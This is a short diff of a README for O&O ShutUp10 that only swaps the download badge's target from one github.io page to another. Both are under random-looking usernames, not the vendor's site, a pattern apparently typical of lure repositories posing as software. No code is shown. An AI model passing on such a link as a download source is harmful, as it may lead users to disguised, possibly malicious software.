@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://blog.oo-software.com/oocontent/uploads/2019/05/ooblog_oosu10_mai19_002.png)
 
-[![Get O&O ShutUp10 Now](https://img.shields.io/badge/Get_O&O_ShutUp10-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/00-shutup10)
+[![Get O&O ShutUp10 Now](https://img.shields.io/badge/Get_O&O_ShutUp10-Now-0a5d8d?style=for-the-badge&logo=github)](https://hudsonwallaceikqe.github.io/.github/0-0-shutup10)
 
 ---
 
